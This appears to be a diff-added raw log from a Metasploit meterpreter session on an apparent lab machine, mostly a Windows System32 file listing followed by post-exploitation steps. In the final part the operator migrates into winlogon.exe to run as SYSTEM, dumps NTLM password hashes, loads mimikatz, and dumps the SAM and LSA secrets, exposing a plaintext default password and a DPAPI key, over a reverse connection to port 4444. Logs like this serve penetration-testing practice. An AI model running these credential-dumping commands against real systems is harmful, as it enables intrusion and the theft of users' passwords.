+100666/rw-rw-rw-  202240     fil   2009-07-13 18:53:20 -0500  wbiosrvc.dll                                     
+100666/rw-rw-rw-  367104     fil   2010-11-20 21:24:35 -0600  wcncsvc.dll                                      
+100666/rw-rw-rw-  1098240    fil   2009-07-13 19:09:31 -0500  wcnwiz.dll                                       
+100666/rw-rw-rw-  1363968    fil   2010-11-20 21:24:19 -0600  wdc.dll                                          
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:14 -0500  wdi                                              
+100666/rw-rw-rw-  91136      fil   2017-07-14 11:29:26 -0500  wdi.dll                                          
+100666/rw-rw-rw-  36352      fil   2010-11-20 21:24:32 -0600  wdiasqmmodule.dll                                
+100666/rw-rw-rw-  210432     fil   2017-07-15 06:34:28 -0500  wdigest.dll                                      
+100666/rw-rw-rw-  217088     fil   2010-11-20 21:24:32 -0600  wdmaud.drv                                       
+100666/rw-rw-rw-  271360     fil   2009-07-13 18:28:18 -0500  wdscore.dll                                      
+100666/rw-rw-rw-  243200     fil   2017-07-14 13:04:30 -0500  webcheck.dll                                     
+100666/rw-rw-rw-  396800     fil   2017-07-14 11:10:29 -0500  webio.dll                                        
+100666/rw-rw-rw-  1158656    fil   2010-11-20 21:24:00 -0600  webservices.dll                                  
+100666/rw-rw-rw-  88576      fil   2009-07-13 18:46:36 -0500  wecapi.dll                                       
+100666/rw-rw-rw-  237568     fil   2009-07-13 18:46:41 -0500  wecsvc.dll                                       
+100777/rwxrwxrwx  113152     fil   2009-07-13 18:46:41 -0500  wecutil.exe                                      
+100666/rw-rw-rw-  484864     fil   2017-07-14 11:22:54 -0500  wer.dll                                          
+100666/rw-rw-rw-  1281024    fil   2010-11-20 21:23:56 -0600  werconcpl.dll                                    
+100666/rw-rw-rw-  84480      fil   2009-07-13 18:40:46 -0500  wercplsupport.dll                                
+100666/rw-rw-rw-  34304      fil   2009-07-13 18:40:39 -0500  werdiagcontroller.dll                            
+100777/rwxrwxrwx  50688      fil   2009-07-13 18:40:44 -0500  wermgr.exe                                       
+100666/rw-rw-rw-  76800      fil   2009-07-13 18:40:49 -0500  wersvc.dll                                       
+100666/rw-rw-rw-  174080     fil   2009-07-13 18:40:46 -0500  werui.dll                                        
+100666/rw-rw-rw-  428032     fil   2009-07-13 18:46:53 -0500  wevtapi.dll                                      
+100666/rw-rw-rw-  116736     fil   2009-07-13 18:46:40 -0500  wevtfwd.dll                                      
+100666/rw-rw-rw-  1646080    fil   2010-11-20 21:23:55 -0600  wevtsvc.dll                                      
+100777/rwxrwxrwx  273920     fil   2009-07-13 18:46:47 -0500  wevtutil.exe                                     
+100777/rwxrwxrwx  143872     fil   2017-07-14 13:04:30 -0500  wextract.exe                                     
+100666/rw-rw-rw-  22528      fil   2009-07-13 19:08:22 -0500  wfapigp.dll                                      
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:14 -0500  wfp                                              
+100666/rw-rw-rw-  35328      fil   2009-07-13 18:31:59 -0500  whealogr.dll                                     
+100777/rwxrwxrwx  43008      fil   2009-07-13 18:25:40 -0500  where.exe                                        
+100666/rw-rw-rw-  18944      fil   2009-07-13 19:10:52 -0500  whhelper.dll                                     
+100777/rwxrwxrwx  52736      fil   2009-07-13 18:25:46 -0500  whoami.exe                                       
+100777/rwxrwxrwx  96256      fil   2009-07-13 19:36:16 -0500  wiaacmgr.exe                                     
+100666/rw-rw-rw-  669696     fil   2009-07-13 19:35:57 -0500  wiaaut.dll                                       
+100666/rw-rw-rw-  462336     fil   2010-11-20 21:24:48 -0600  wiadefui.dll                                     
+100666/rw-rw-rw-  141824     fil   2009-07-13 19:35:26 -0500  wiadss.dll                                       
+100666/rw-rw-rw-  43520      fil   2009-07-13 19:35:30 -0500  wiarpc.dll                                       
+100666/rw-rw-rw-  99328      fil   2009-07-13 19:35:21 -0500  wiascanprofiles.dll                              
+100666/rw-rw-rw-  580096     fil   2010-11-20 21:24:48 -0600  wiaservc.dll                                     
+100666/rw-rw-rw-  464384     fil   2009-07-13 19:36:18 -0500  wiashext.dll                                     
+100666/rw-rw-rw-  14848      fil   2009-07-13 19:35:22 -0500  wiatrace.dll                                     
+100666/rw-rw-rw-  124928     fil   2010-11-20 21:24:48 -0600  wiavideo.dll                                     
+100777/rwxrwxrwx  36352      fil   2009-07-13 19:35:29 -0500  wiawow64.exe                                     
+100666/rw-rw-rw-  503296     fil   2009-07-13 18:29:42 -0500  wimgapi.dll                                      
+100777/rwxrwxrwx  403968     fil   2009-07-13 18:29:41 -0500  wimserv.exe                                      
+100666/rw-rw-rw-  3208192    fil   2017-07-14 11:18:29 -0500  win32k.sys                                       
+100666/rw-rw-rw-  756736     fil   2017-07-14 11:23:17 -0500  win32spl.dll                                     
+100666/rw-rw-rw-  78848      fil   2009-07-13 18:53:13 -0500  winbio.dll                                       
+100666/rw-rw-rw-  16384      fil   2009-07-13 18:30:40 -0500  winbrand.dll                                     
+100666/rw-rw-rw-  39936      fil   2017-07-14 11:22:04 -0500  wincredprovider.dll                              
+100666/rw-rw-rw-  99328      fil   2009-07-13 19:08:15 -0500  winethc.dll                                      
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:14 -0500  winevt                                           
+100666/rw-rw-rw-  444928     fil   2017-07-14 11:10:35 -0500  winhttp.dll                                      
+100666/rw-rw-rw-  2426880    fil   2017-07-14 13:04:31 -0500  wininet.dll                                      
+100777/rwxrwxrwx  129024     fil   2009-07-13 18:52:37 -0500  wininit.exe                                      
+100666/rw-rw-rw-  105472     fil   2017-07-14 11:10:46 -0500  winipsec.dll                                     
+100666/rw-rw-rw-  706280     fil   2017-07-15 06:34:29 -0500  winload.efi                                      
+100777/rwxrwxrwx  634432     fil   2017-07-14 11:12:06 -0500  winload.exe                                      
+100777/rwxrwxrwx  455168     fil   2017-07-14 11:11:25 -0500  winlogon.exe                                     
+100666/rw-rw-rw-  217600     fil   2009-07-13 19:18:51 -0500  winmm.dll                                        
+100666/rw-rw-rw-  26112      fil   2009-07-13 18:21:08 -0500  winnsi.dll                                       
+100666/rw-rw-rw-  631176     fil   2017-07-15 06:34:29 -0500  winresume.efi                                    
+100777/rwxrwxrwx  546656     fil   2017-07-14 11:26:40 -0500  winresume.exe                                    
+40777/rwxrwxrwx   0          dir   2011-04-12 02:45:18 -0500  winrm                                            
+100777/rwxrwxrwx  35         fil   2009-06-10 16:00:54 -0500  winrm.cmd                                        
+100666/rw-rw-rw-  201034     fil   2009-07-13 17:53:10 -0500  winrm.vbs                                        
+100666/rw-rw-rw-  28672      fil   2009-07-13 18:53:41 -0500  winrnr.dll                                       
+100777/rwxrwxrwx  51200      fil   2009-07-13 18:47:54 -0500  winrs.exe                                        
+100666/rw-rw-rw-  363520     fil   2009-07-13 18:48:02 -0500  winrscmd.dll                                     
+100777/rwxrwxrwx  24064      fil   2009-07-13 18:47:55 -0500  winrshost.exe                                    
+100666/rw-rw-rw-  1536       fil   2009-07-13 18:47:49 -0500  winrsmgr.dll                                     
+100666/rw-rw-rw-  13312      fil   2009-07-13 18:47:48 -0500  winrssrv.dll                                     
+100666/rw-rw-rw-  13312      fil   2009-07-13 18:53:14 -0500  winshfhc.dll                                     
+100666/rw-rw-rw-  88576      fil   2009-07-13 19:10:35 -0500  winsockhc.dll                                    
+100666/rw-rw-rw-  442368     fil   2010-11-20 21:23:55 -0600  winspool.drv                                     
+100666/rw-rw-rw-  215552     fil   2017-07-15 06:34:28 -0500  winsrv.dll                                       
+100666/rw-rw-rw-  235520     fil   2017-07-14 11:11:25 -0500  winsta.dll                                       
+100666/rw-rw-rw-  228864     fil   2017-07-15 06:34:28 -0500  wintrust.dll                                     
+100666/rw-rw-rw-  20480      fil   2009-07-13 19:06:26 -0500  winusb.dll                                       
+100777/rwxrwxrwx  80384      fil   2009-07-13 18:57:30 -0500  winver.exe                                       
+100777/rwxrwxrwx  405504     fil   2010-11-20 21:25:10 -0600  wisptis.exe                                      
+100666/rw-rw-rw-  71680      fil   2010-11-20 21:24:26 -0600  wkscli.dll                                       
+100777/rwxrwxrwx  248832     fil   2010-11-20 21:24:32 -0600  wksprt.exe                                       
+100666/rw-rw-rw-  12800      fil   2009-07-13 19:16:36 -0500  wksprtPS.dll                                     
+100666/rw-rw-rw-  118784     fil   2010-11-20 21:24:32 -0600  wkssvc.dll                                       
+100666/rw-rw-rw-  114176     fil   2009-07-13 19:07:15 -0500  wlanapi.dll                                      
+100666/rw-rw-rw-  168448     fil   2009-07-13 19:07:15 -0500  wlancfg.dll                                      
+100666/rw-rw-rw-  501248     fil   2009-07-13 19:07:22 -0500  wlandlg.dll                                      
+100777/rwxrwxrwx  99328      fil   2009-07-13 19:07:15 -0500  wlanext.exe                                      
+100666/rw-rw-rw-  475136     fil   2010-11-20 21:23:53 -0600  wlangpui.dll                                     
+100666/rw-rw-rw-  119296     fil   2009-07-13 19:07:14 -0500  wlanhlp.dll                                      
+100666/rw-rw-rw-  19968      fil   2009-07-13 19:07:15 -0500  wlaninst.dll                                     
+100666/rw-rw-rw-  414720     fil   2010-11-20 21:24:33 -0600  wlanmsm.dll                                      
+100666/rw-rw-rw-  1441280    fil   2010-11-20 21:24:33 -0600  wlanpref.dll                                     
+100666/rw-rw-rw-  448000     fil   2009-07-13 19:07:14 -0500  wlansec.dll                                      
+100666/rw-rw-rw-  886784     fil   2009-07-13 19:07:34 -0500  wlansvc.dll                                      
+100666/rw-rw-rw-  414208     fil   2010-11-20 21:24:33 -0600  wlanui.dll                                       
+100666/rw-rw-rw-  10752      fil   2009-07-13 19:07:17 -0500  wlanutil.dll                                     
+100666/rw-rw-rw-  108544     fil   2009-07-13 19:07:14 -0500  wlgpclnt.dll                                     
+100777/rwxrwxrwx  44544      fil   2009-07-13 18:52:30 -0500  wlrmdr.exe                                       
+100666/rw-rw-rw-  44032      fil   2009-07-13 19:22:17 -0500  wmcodecdspps.dll                                 
+100666/rw-rw-rw-  37888      fil   2009-07-13 19:21:19 -0500  wmdmlog.dll                                      
+100666/rw-rw-rw-  117248     fil   2009-07-13 19:21:19 -0500  wmdmps.dll                                       
+100666/rw-rw-rw-  636416     fil   2010-11-20 21:24:38 -0600  wmdrmdev.dll                                     
+100666/rw-rw-rw-  527872     fil   2010-11-20 21:24:38 -0600  wmdrmnet.dll                                     
+100666/rw-rw-rw-  781312     fil   2010-11-20 21:24:52 -0600  wmdrmsdk.dll                                     
+100666/rw-rw-rw-  2048       fil   2009-07-13 19:23:06 -0500  wmerror.dll                                      
+100666/rw-rw-rw-  5120       fil   2017-07-14 11:34:48 -0500  wmi.dll                                          
+100666/rw-rw-rw-  524288     fil   2010-11-20 21:24:00 -0600  wmicmiplugin.dll                                 
+100666/rw-rw-rw-  211968     fil   2009-07-13 19:23:23 -0500  wmidx.dll                                        
+100666/rw-rw-rw-  27648      fil   2009-07-13 18:22:42 -0500  wmiprop.dll                                      
+100666/rw-rw-rw-  14633472   fil   2010-11-20 21:24:52 -0600  wmp.dll                                          
+100666/rw-rw-rw-  28672      fil   2009-07-13 19:23:29 -0500  wmpcm.dll                                        
+100666/rw-rw-rw-  358400     fil   2010-11-20 21:24:52 -0600  wmpdxm.dll                                       
+100666/rw-rw-rw-  605696     fil   2010-11-20 21:24:52 -0600  wmpeffects.dll                                   
+100666/rw-rw-rw-  12625920   fil   2010-11-20 21:24:52 -0600  wmploc.DLL                                       
+100666/rw-rw-rw-  1026048    fil   2017-07-14 11:11:30 -0500  wmpmde.dll                                       
+100666/rw-rw-rw-  481280     fil   2010-11-20 21:24:52 -0600  wmpps.dll                                        
+100666/rw-rw-rw-  132608     fil   2010-11-20 21:24:52 -0600  wmpshell.dll                                     
+100666/rw-rw-rw-  223232     fil   2010-11-20 21:24:52 -0600  wmpsrcwp.dll                                     
+100666/rw-rw-rw-  14848      fil   2009-07-13 18:52:25 -0500  wmsgapi.dll                                      
+100666/rw-rw-rw-  184832     fil   2009-07-13 19:23:02 -0500  wmvdspa.dll                                      
+100666/rw-rw-rw-  243712     fil   2017-07-15 06:34:28 -0500  wow64.dll                                        
+100666/rw-rw-rw-  13312      fil   2017-07-15 06:34:27 -0500  wow64cpu.dll                                     
+100666/rw-rw-rw-  362496     fil   2017-07-15 06:34:28 -0500  wow64win.dll                                     
+100777/rwxrwxrwx  16384      fil   2009-07-13 18:26:37 -0500  wowreg32.exe                                     
+100666/rw-rw-rw-  135680     fil   2009-07-13 18:55:44 -0500  wpcao.dll                                        
+100666/rw-rw-rw-  812032     fil   2010-11-20 21:24:36 -0600  wpccpl.dll                                       
+100666/rw-rw-rw-  17408      fil   2009-07-13 18:55:48 -0500  wpcmig.dll                                       
+100666/rw-rw-rw-  12288      fil   2009-07-13 18:55:50 -0500  wpcsvc.dll                                       
+100666/rw-rw-rw-  188416     fil   2009-07-13 18:55:43 -0500  wpcumi.dll                                       
+100666/rw-rw-rw-  611840     fil   2010-11-20 21:24:52 -0600  wpd_ci.dll                                       
+100666/rw-rw-rw-  117248     fil   2010-11-20 21:24:52 -0600  wpdbusenum.dll                                   
+100666/rw-rw-rw-  2543104    fil   2017-07-14 11:22:13 -0500  wpdshext.dll                                     
+100666/rw-rw-rw-  215040     fil   2010-11-20 21:24:52 -0600  wpdwcn.dll                                       
+100777/rwxrwxrwx  48640      fil   2017-07-14 11:23:17 -0500  wpnpinst.exe                                     
+100777/rwxrwxrwx  10240      fil   2009-07-13 18:56:28 -0500  write.exe                                        
+100666/rw-rw-rw-  296448     fil   2017-07-14 11:10:35 -0500  ws2_32.dll                                       
+100666/rw-rw-rw-  4608       fil   2009-07-13 19:10:28 -0500  ws2help.dll                                      
+100666/rw-rw-rw-  63488      fil   2010-11-20 21:24:48 -0600  wscapi.dll                                       
+100666/rw-rw-rw-  146432     fil   2009-07-13 18:48:27 -0500  wscinterop.dll                                   
+100666/rw-rw-rw-  22528      fil   2009-07-13 18:48:21 -0500  wscisvif.dll                                     
+100666/rw-rw-rw-  68608      fil   2009-07-13 19:10:32 -0500  wscmisetup.dll                                   
+100666/rw-rw-rw-  13824      fil   2009-07-13 18:48:19 -0500  wscproxystub.dll                                 
+100777/rwxrwxrwx  168960     fil   2017-07-14 11:09:08 -0500  wscript.exe                                      
+100666/rw-rw-rw-  97280      fil   2009-07-13 18:48:32 -0500  wscsvc.dll                                       
+100666/rw-rw-rw-  1162240    fil   2009-07-13 18:48:37 -0500  wscui.cpl                                        
+100666/rw-rw-rw-  26112      fil   2010-11-20 21:24:21 -0600  wsdchngr.dll                                     
+100666/rw-rw-rw-  1495552    fil   2009-07-13 18:46:17 -0500  wsecedit.dll                                     
+100666/rw-rw-rw-  23040      fil   2009-07-13 19:29:49 -0500  wsepno.dll                                       
+100666/rw-rw-rw-  47104      fil   2010-11-20 21:24:36 -0600  wshbth.dll                                       
+100666/rw-rw-rw-  28160      fil   2009-07-13 18:58:19 -0500  wshcon.dll                                       
+100666/rw-rw-rw-  19968      fil   2009-07-13 19:10:32 -0500  wshelper.dll                                     
+100666/rw-rw-rw-  104960     fil   2009-07-13 18:58:25 -0500  wshext.dll                                       
+100666/rw-rw-rw-  13824      fil   2009-07-13 18:21:21 -0500  wship6.dll                                       
+100666/rw-rw-rw-  13824      fil   2010-11-20 21:24:36 -0600  wshirda.dll                                      
+100666/rw-rw-rw-  13312      fil   2009-07-13 19:09:22 -0500  wshnetbs.dll                                     
+100666/rw-rw-rw-  150016     fil   2017-07-14 11:09:08 -0500  wshom.ocx                                        
+100666/rw-rw-rw-  16896      fil   2009-07-13 19:09:31 -0500  wshqos.dll                                       
+100666/rw-rw-rw-  17408      fil   2017-07-14 11:20:23 -0500  wshrm.dll                                        
+100666/rw-rw-rw-  4675       fil   2009-07-13 17:53:10 -0500  wsmanconfig_schema.xml                           
+100666/rw-rw-rw-  13312      fil   2009-07-13 18:47:50 -0500  wsmplpxy.dll                                     
+100777/rwxrwxrwx  13824      fil   2009-07-13 18:47:56 -0500  wsmprovhost.exe                                  
+100666/rw-rw-rw-  67072      fil   2010-11-20 21:24:28 -0600  wsnmp32.dll                                      
+100666/rw-rw-rw-  18432      fil   2009-07-13 19:10:30 -0500  wsock32.dll                                      
+100777/rwxrwxrwx  293888     fil   2010-11-20 21:24:49 -0600  wsqmcons.exe                                     
+100666/rw-rw-rw-  54272      fil   2009-07-13 19:17:14 -0500  wtsapi32.dll                                     
+100666/rw-rw-rw-  12288      fil   2017-07-15 06:34:28 -0500  wu.upgrade.ps.dll                                
+100666/rw-rw-rw-  709120     fil   2017-07-15 06:34:30 -0500  wuapi.dll                                        
+100777/rwxrwxrwx  37888      fil   2017-07-15 06:34:30 -0500  wuapp.exe                                        
+100777/rwxrwxrwx  140288     fil   2017-07-15 06:34:30 -0500  wuauclt.exe                                      
+100666/rw-rw-rw-  2607104    fil   2017-07-15 06:34:30 -0500  wuaueng.dll                                      
+100666/rw-rw-rw-  3156480    fil   2017-07-15 06:34:30 -0500  wucltux.dll                                      
+100666/rw-rw-rw-  98816      fil   2017-07-15 06:34:30 -0500  wudriver.dll                                     
+100666/rw-rw-rw-  36864      fil   2017-07-15 06:34:28 -0500  wups.dll                                         
+100666/rw-rw-rw-  37888      fil   2017-07-15 06:34:28 -0500  wups2.dll                                        
+100777/rwxrwxrwx  307200     fil   2010-11-20 21:23:55 -0600  wusa.exe                                         
+100666/rw-rw-rw-  192512     fil   2017-07-15 06:34:30 -0500  wuwebv.dll                                       
+100666/rw-rw-rw-  594432     fil   2010-11-20 21:24:19 -0600  wvc.dll                                          
+100666/rw-rw-rw-  49664      fil   2009-07-13 19:12:23 -0500  wwancfg.dll                                      
+100666/rw-rw-rw-  222720     fil   2010-11-20 21:24:33 -0600  wwanconn.dll                                     
+100666/rw-rw-rw-  15872      fil   2009-07-13 19:12:17 -0500  wwaninst.dll                                     
+100666/rw-rw-rw-  693248     fil   2009-07-13 19:12:27 -0500  wwanmm.dll                                       
+100666/rw-rw-rw-  48640      fil   2017-07-14 11:23:23 -0500  wwanprotdim.dll                                  
+100666/rw-rw-rw-  228864     fil   2017-07-14 11:23:23 -0500  wwansvc.dll                                      
+100666/rw-rw-rw-  36352      fil   2009-07-13 19:12:15 -0500  wwapi.dll                                        
+100666/rw-rw-rw-  103936     fil   2009-07-13 19:08:48 -0500  wzcdlg.dll                                       
+100777/rwxrwxrwx  43008      fil   2009-07-13 18:25:32 -0500  xcopy.exe                                        
+100666/rw-rw-rw-  67072      fil   2009-07-13 19:29:58 -0500  xmlfilter.dll                                    
+100666/rw-rw-rw-  199680     fil   2017-07-14 11:24:01 -0500  xmllite.dll                                      
+100666/rw-rw-rw-  22016      fil   2009-07-13 19:08:30 -0500  xmlprovi.dll                                     
+100666/rw-rw-rw-  59392      fil   2009-07-13 18:59:26 -0500  xolehlp.dll                                      
+100777/rwxrwxrwx  4835840    fil   2009-07-13 19:47:50 -0500  xpsrchvw.exe                                     
+100666/rw-rw-rw-  76060      fil   2009-06-10 15:31:09 -0500  xpsrchvw.xml                                     
+100666/rw-rw-rw-  3008000    fil   2010-11-20 21:24:32 -0600  xpsservices.dll                                  
+100666/rw-rw-rw-  1576448    fil   2009-07-13 19:42:07 -0500  xpssvcs.dll                                      
+100666/rw-rw-rw-  4041       fil   2009-06-10 16:03:31 -0500  xwizard.dtd                                      
+100777/rwxrwxrwx  42496      fil   2009-07-13 19:06:58 -0500  xwizard.exe                                      
+100666/rw-rw-rw-  432640     fil   2009-07-13 19:07:03 -0500  xwizards.dll                                     
+100666/rw-rw-rw-  101888     fil   2009-07-13 19:06:54 -0500  xwreg.dll                                        
+100666/rw-rw-rw-  201216     fil   2009-07-13 19:06:57 -0500  xwtpdui.dll                                      
+100666/rw-rw-rw-  129536     fil   2009-07-13 19:06:56 -0500  xwtpw32.dll                                      
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:14 -0500  zh-CN                                            
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:14 -0500  zh-HK                                            
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:14 -0500  zh-TW                                            
+100666/rw-rw-rw-  366080     fil   2010-11-20 21:24:01 -0600  zipfldr.dll                                      
+
+meterpreter > ps           
+
+Process List               
+============               
+
+ PID   PPID  Name                     Arch  Session  User                          Path                        
+ ---   ----  ----                     ----  -------  ----                          ----                        
+ 0     0     [System Process]                                                                                  
+ 4     0     System                   x64   0                                                                  
+ 288   4     smss.exe                 x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe                          
+ 368   360   csrss.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe                          
+ 412   360   wininit.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe                        
+ 436   424   csrss.exe                x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe                          
+ 468   424   winlogon.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe                       
+ 516   524   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE                              
+ 524   412   services.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe                       
+ 540   412   lsass.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe                          
+ 548   412   lsm.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe 
+ 652   524   svchost.exe              x64   0        NT AUTHORITY\SYSTEM                                       
+ 736   524   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE                              
+ 804   524   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE                                
+ 824   468   LogonUI.exe              x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe                        
+ 864   524   svchost.exe              x64   0        NT AUTHORITY\SYSTEM                                       
+ 884   524   TrustedInstaller.exe     x64   0        NT AUTHORITY\SYSTEM                                       
+ 900   524   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE                                
+ 944   524   svchost.exe              x64   0        NT AUTHORITY\SYSTEM                                       
+ 1052  524   spoolsv.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe                        
+ 1084  524   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE                                
+ 1212  524   svchost.exe              x64   0        NT AUTHORITY\SYSTEM                                       
+ 1292  524   VGAuthService.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe               
+ 1388  524   vmtoolsd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe      
+ 1428  524   ManagementAgentHost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe    
+ 1812  524   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE                              
+ 2040  652   WmiPrvSE.exe                                                                                      
+ 2096  524   msdtc.exe                x64   0        NT AUTHORITY\NETWORK SERVICE                              
+ 2236  524   svchost.exe              x64   0        NT AUTHORITY\SYSTEM                                       
+ 2408  652   WmiPrvSE.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe                  
+ 2860  524   sppsvc.exe               x64   0        NT AUTHORITY\NETWORK SERVICE                              
+ 2896  524   svchost.exe              x64   0        NT AUTHORITY\SYSTEM                                       
+ 2988  524   SearchIndexer.exe        x64   0        NT AUTHORITY\SYSTEM                                       
+
+meterpreter > ps | grep winlogon                       
+
+^C[-] Error running command ps: Interrupt              
+meterpreter > migrate 468  
+[*] Migrating from 1052 to 468...                      
+[*] Migration completed successfully.                  
+meterpreter > getuid       
+Server username: NT AUTHORITY\SYSTEM                   
+meterpreter >  getpid      
+Current pid: 468           
+meterpreter > grep         
+[-] Unknown command: grep. 
+meterpreter > hashdump     
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::                         
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                 
+haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::                                
+meterpreter > netstat -aon 
+
+Connection list            
+===============            
+
+    Proto  Local address      Remote address    State        User  Inode  PID/Program name                     
+    -----  -------------      --------------    -----        ----  -----  ----------------                     
+    tcp    0.0.0.0:135        0.0.0.0:*         LISTEN       0     0      736/svchost.exe                      
+    tcp    0.0.0.0:445        0.0.0.0:*         LISTEN       0     0      4/System                             
+    tcp    0.0.0.0:49152      0.0.0.0:*         LISTEN       0     0      412/wininit.exe                      
+    tcp    0.0.0.0:49153      0.0.0.0:*         LISTEN       0     0      804/svchost.exe                      
+    tcp    0.0.0.0:49154      0.0.0.0:*         LISTEN       0     0      944/svchost.exe                      
+    tcp    0.0.0.0:49155      0.0.0.0:*         LISTEN       0     0      524/services.exe                     
+    tcp    0.0.0.0:49156      0.0.0.0:*         LISTEN       0     0      1812/svchost.exe                     
+    tcp    0.0.0.0:49157      0.0.0.0:*         LISTEN       0     0      540/lsass.exe                        
+    tcp    10.10.10.40:139    0.0.0.0:*         LISTEN       0     0      4/System                             
+    tcp    10.10.10.40:49158  10.10.14.19:4444  CLOSE_WAIT   0     0      1052/spoolsv.exe                     
+    tcp    10.10.10.40:49159  10.10.14.19:4444  ESTABLISHED  0     0      1052/spoolsv.exe                     
+    tcp6   :::135             :::*              LISTEN       0     0      736/svchost.exe                      
+    tcp6   :::445             :::*              LISTEN       0     0      4/System                             
+    tcp6   :::49152           :::*              LISTEN       0     0      412/wininit.exe                      
+    tcp6   :::49153           :::*              LISTEN       0     0      804/svchost.exe                      
+    tcp6   :::49154           :::*              LISTEN       0     0      944/svchost.exe                      
+    tcp6   :::49155           :::*              LISTEN       0     0      524/services.exe                     
+    tcp6   :::49156           :::*              LISTEN       0     0      1812/svchost.exe                     
+    tcp6   :::49157           :::*              LISTEN       0     0      540/lsass.exe                        
+    udp    0.0.0.0:123        0.0.0.0:*                      0     0      900/svchost.exe                      
+    udp    0.0.0.0:500        0.0.0.0:*                      0     0      944/svchost.exe                      
+    udp    0.0.0.0:4500       0.0.0.0:*                      0     0      944/svchost.exe                      
+    udp    0.0.0.0:5355       0.0.0.0:*                      0     0      516/svchost.exe                      
+    udp    10.10.10.40:137    0.0.0.0:*                      0     0      4/System                             
+    udp    10.10.10.40:138    0.0.0.0:*                      0     0      4/System                             
+    udp6   :::123             :::*                           0     0      900/svchost.exe                      
+    udp6   :::500             :::*                           0     0      944/svchost.exe                      
+    udp6   :::4500            :::*                           0     0      944/svchost.exe                      
+    udp6   :::5355            :::*                           0     0      516/svchost.exe                      
+
+meterpreter > arp -a       
+
+ARP cache                  
+=========                  
+
+    IP address    MAC address        Interface         
+    ----------    -----------        ---------         
+    10.10.10.2    00:50:56:b9:8a:9f  11                
+    10.10.10.255  ff:ff:ff:ff:ff:ff  11                
+    224.0.0.22    00:00:00:00:00:00  1                 
+    224.0.0.22    01:00:5e:00:00:16  11                
+    224.0.0.252   01:00:5e:00:00:fc  11                
+
+meterpreter > load kiwi    
+Loading extension kiwi...  
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)      
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)            
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                       
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz 
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )                                      
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/                                      
+
+Success.                   
+meterpreter > creds_all    
+[+] Running as SYSTEM      
+[*] Retrieving all credentials                         
+wdigest credentials        
+===================        
+
+Username   Domain     Password                         
+--------   ------     --------                         
+(null)     (null)     (null)                           
+HARIS-PC$  WORKGROUP  (null)                           
+
+kerberos credentials       
+====================       
+
+Username   Domain     Password                         
+--------   ------     --------                         
+(null)     (null)     (null)                           
+haris-pc$  WORKGROUP  (null)                           
+
+
+meterpreter > lsa_dump     
+[-] Unknown command: lsa_dump.                         
+meterpreter > lsa_dump_sam 
+[+] Running as SYSTEM      
+[*] Dumping SAM            
+Domain : HARIS-PC          
+SysKey : a749692f1dc76b46d7141ef778aa6bef              
+Local SID : S-1-5-21-319597671-3711062392-2889596693   
+
+SAMKey : a226d4d47dab3eb7a306c8b85ec359cb              
+
+RID  : 000001f4 (500)      
+User : Administrator       
+  Hash NTLM: cdf51b162460b7d5bc898f493751a0cc          
+
+RID  : 000001f5 (501)      
+User : Guest               
+
+RID  : 000003e8 (1000)     
+User : haris               
+  Hash NTLM: 8002bc89de91f6b52d518bde69202dc6          
+
+
+meterpreter > lsa_dump_secrets                         
+[+] Running as SYSTEM      
+[*] Dumping LSA secrets    
+Domain : HARIS-PC          
+SysKey : a749692f1dc76b46d7141ef778aa6bef              
+
+Local name : haris-PC ( S-1-5-21-319597671-3711062392-2889596693 )                                             
+Domain name : WORKGROUP    
+
+Policy subsystem is : 1.11 
+LSA Key(s) : 1, default {060be82b-0750-887a-808d-0774087457db}                                                 
+  [00] {060be82b-0750-887a-808d-0774087457db} d28ec83ef05184b93100beaa4d64a6a1a420b8a7a144c943fe57f60fbaa6425d 
+
+Secret  : DefaultPassword  
+old/text: kERjCoEmxdlSD    
+
+Secret  : DPAPI_SYSTEM     
+cur/hex : 01 00 00 00 0a f3 a4 c2 1c ac 07 2f 83 07 61 b5 02 67 89 78 95 2d f3 0d 0f c8 4e 4e a5 c8 92 f6 74 a6 ea b6 fb 62 3e a7 93 cf cf 6f                         
+    full: 0af3a4c21cac072f830761b502678978952df30d0fc84e4ea5c892f674a6eab6fb623ea793cfcf6f                     
